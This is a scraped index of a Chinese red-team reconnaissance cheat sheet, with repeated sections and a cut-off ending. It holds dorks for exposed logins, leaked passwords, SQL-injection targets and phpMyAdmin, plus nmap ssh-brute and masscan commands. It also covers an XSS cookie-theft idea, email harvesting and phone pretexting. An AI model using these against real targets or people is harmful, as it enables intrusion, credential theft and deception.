搜索这个所有域名 related: xx.com 搜索相关网站 book: Lisa+CA phone电话簿查询美国街道地址和电话号码信息。例如 “phonebook:Lisa+CA”将查询名字里面包含”Lisa” 并住在加州的人的所有名字。 allinanchor 限制搜索结果必须是那些在anchor文字里包含了我们所有查询关键词的网页。 allintext 限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。 allintitle 限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。 allinurl 限制搜索结果仅是那些在URL（网址）里边包含了我们所有查询关键词的网页。 author 限制返回结果仅仅是那些在Google论坛里边，包含了特定作者的新闻文章。 bphonebook 用bphonebook进行查询的时候，返回结果将是那些商务电话资料。 datarange 将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被google收录的时间算的。 define 返回包含查询关键词定义的网面。 ext 用于filetype:查找扩散名为ext的文件。 group 限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。 id 又是一个没有证实的语法，效果很一般。 insubject 限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。 location 当我们提交location进行Google新闻查询的时候，Google仅会返回你当前指定区的跟查询关键词相关的网页。 movie 用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。 phonebook 用phonebook进行查询的时候，Google会返回美国当地跟查询关键词相关的电话信息。 related 用related提交查询，Google会返回跟我们要查询的网站结构内容相似的一些其它网站。 rphonebook 查询用来搜索美国当地跟查询关键词相关的住宅电话信息。 safesearch 用safesearch提交查询的时候，Google会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。 source 用source提交查询的时候，Google新闻会限制我们的查询仅是那些我们指定了特定ID或新闻源的网址。 stocks 返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。 store 查询的时候，Google Froogle仅会显示我们指定了store ID的结果。 tq 如果想查某个地方的天气如何,我们只要在Google搜索框中输入”城市名称 Tq”就可以查询到这个城市的天状况.例”北京 tq”,当然tq也可以用汉字的天气代替。 weather 用weather提交查询的时候，如果我们指出一个Google可以识别的地区或城市，Google会返回该地区或城市当前的天气状况。 Related:URL 搜索结果将展示与这个URL链接页面相关的页面。”相关”除了和该页面内容相关的页面外，还包括这个页面的导入链接和导出链接所指向的页面。 Ext “Ext:文件后缀”。它可以帮你搜索各种后缀格式的文件。比如说： xls (微软 Excel) ppt (微软 PowerPoint) doc (微软 Word) pdf (Adobe 文件) html or htm (HTML代码文件) Inanchor 搜索结果中必须出现以这个关键词为链接关键词的链接。 谷歌常用搜索语法： AND：缺一不可 OR：两者皆可 \"\"：为一个关键词 -：不包含某关键词 +：不忽略某关键词 “~”：同义词匹配搜索 “?”和“*”：占位通配符 关键字搜索 site：指定域名，如：site:edu.cn 搜索教育网站 inurl：用于搜索包含的url关键词的网页，如：inurl:login 搜索网址中含有login的网页 intitle：搜索网页标题中的关键字，如：intitle:“index of /admin” intext：搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码 filetype：按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp 查找后台 site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user 查找sql注入漏洞 inurl:.php?id=23 公司 inurl:.asp?id=11 查找上传点： site:xx.com inurl:file| uploadfile 查找敏感信息泄露 intitle:\"Index of /admin\" intitle:\"Index of /root\" intitle:\"Index of /\" +password.txt intitle:phpinfo()或者inurl:phpinfo.php 查找未授权访问phpmyadmin inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:1","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#谷歌常用搜索语法"},{"categories":["hvv"],"content":"\r0x02 GitHub 信息收集 数据库信息泄露 site:github.com root password site:github.com sa password site:github.com User ID=’sa’;Password svn信息泄露 site:github.com svn site:github.com svn password site:github.com svn username site:github.com svn username password 数据库备份文件 site:github.com inurl:sql 综合信息泄露 site:github.com password site:github.com ftp ftppassword site:github.com 密码 site:github.com 内部 Github 信息收集 https://github.com/michenriksen/gitrob https://securitytrails.com/blog/github-dorks ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:2","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x02-github-信息收集"},{"categories":["hvv"],"content":"\r0x03 搜索空间信息收集子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ FOFA常用语法： 1、domain= \"qq.com\" //搜索qq.com所有的子域名 2、host=\"edu.cn\" //从url中搜索edu.cn 3、ip= \"11.1.1.1\" //搜索ip 4、server=\"apache\" //搜索服务是apache的网站 5、os=\"windows\" //搜素操作系统是windows的网站 6、port=3306 或者 protocol==\"mysql\" //搜索mysql数据库的网站 7、app=\"致远\" //搜索致远oa办公系统搭建的网站 8、title=\"登陆\" //从标题中搜索登陆 9、header=\"thinkphp\" //从http的头里面搜thinkphp ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:3","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x03-搜索空间信息收集"},{"categories":["hvv"],"content":"\r0x03 搜索空间信息收集子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ FOFA常用语法： 1、domain= \"qq.com\" //搜索qq.com所有的子域名 2、host=\"edu.cn\" //从url中搜索edu.cn 3、ip= \"11.1.1.1\" //搜索ip 4、server=\"apache\" //搜索服务是apache的网站 5、os=\"windows\" //搜素操作系统是windows的网站 6、port=3306 或者 protocol==\"mysql\" //搜索mysql数据库的网站 7、app=\"致远\" //搜索致远oa办公系统搭建的网站 8、title=\"登陆\" //从标题中搜索登陆 9、header=\"thinkphp\" //从http的头里面搜thinkphp ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:3","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#fofa常用语法"},{"categories":["hvv"],"content":"\r0x04 端口、邮箱、备案收集 名称 地址或命令 Tag1-Nmap端口扫描 nmap -sS -T4 -Pn –open -n -p- -iL ***.txt -oX *** 小蓝本 https://www.xiaolanben.com/ ThreatScan https://scan.top15.cn/web/ 邮箱收集 https://www.email-format.com/ 注册edu邮箱 往下面看当前0x03 的PS的内容 奇怪域名收集 https://archive.org/web/ Aquatone —子域名截图 https://github.com/michenriksen/aquatone Github 收集 “.com” login “.com” ftp “.com” password “.com” token 图标hash搜索 1. 平台 2. 领英3. 脉脉 4. 新媒体资产5. 抓公众号、小程序链接，能发现一堆奇奇怪怪的资产；还有抖音，支付宝商号等等 Fuzz 资产存活，但却访问不了，是因为目录不正确，收集一个高命中率的资产字典进行fuzz Hosts碰撞 https://github.com/r35tart/Hosts_scan用于碰撞某些绑定了host的域名进行强制匹配进行访问，跟改了本地host文件一样 JS分析 网页的JS中往往存在着奇奇怪怪的URL，里面有些参数说不定也有，意想不到的接口泄露 推荐工具JSfinderhttps://github.com/Threezh1/JSFinder 客服窗口 为什么此处会说客户窗口？说不定能弹个XSS，在打点的时候可以用此处知道客户的后台地址和Cookie Crunchbase Crunchbase是一个以Web 2.0方式表达的创业公司数据库，包含了创始人，关键雇员，财务状况，收购新闻以及其他重要事件 https://www.crunchbase.com ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:4","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x04-端口邮箱备案收集"},{"categories":["hvv"],"content":"\r0x05 端口检测 名称 地址 在线端口检测 http://coolaf.com/tool/port 扫描主机端口 nmap -T5 -A -v -p- 扫描一个IP段，探测存活主机 nmap -sP 探测操作系统类型 nmap -0 寻找登录授权页面 nmap -p 80 –script http-auth-finder \u003cwww.xxx.com\u003e SSH爆破 nmap -p22 –script ssh-brute dns 域传送漏洞 nmap -p 53 –script dns-zone-transfer.nse -v Masscan Masscan 127.0.0.0/24 -p443 # 单端口扫描 Masscan Masscan 127.0.0.0/24 –top-ports 100 -rate 100000 # 快速扫描 Masscan Masscan 127.0.0.0/24 –top-ports 100 –excludefile exclude.txt # 排除指定目标 Masscan Masscan 127.0.0.0/24 -p20,21,22,23,80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070 \u003e results.txt ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:5","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x05-端口检测"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x06-邮箱收集技巧"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#使用邮箱地址查找工具"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 